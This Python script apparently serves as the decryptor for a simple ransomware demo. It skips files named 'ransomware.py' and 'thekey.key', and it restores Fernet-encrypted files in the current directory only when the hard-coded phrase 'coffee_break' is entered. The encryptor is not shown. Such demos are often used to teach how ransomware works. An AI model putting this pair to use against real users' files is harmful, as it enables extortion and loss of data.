import os
from cryptography.fernet import Fernet

def get_encrypted_files():
    """Find all encrypted files in the current directory."""
    files = []
    for file in os.listdir():
        if file in ("ransomware.py", "thekey.key", "decrypt.py"):
            continue
        if os.path.isfile(file):
            files.append(file)
    return files

def load_secret_key():
    """Find the stored encryption key."""
    with open("thekey.key", "rb") as thekey:
        return thekey.read()

def decrypt_files(files, secretkey):
    """Decrypt the given files using the provided key."""
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)

def main():
    files = get_encrypted_files()
    secretkey = load_secret_key()
    
    secret_phrase = "coffee_break"
    user_phrase = input("Enter the secret phrase to decrypt your files \n")
    
    if user_phrase == secret_phrase:
        decrypt_files(files, secretkey)
        print("Congratulations! You have decrypted all of your files!")
    else:
        print("Sorry! Wrong secret phrase!")

if __name__ == "__main__":
    main()
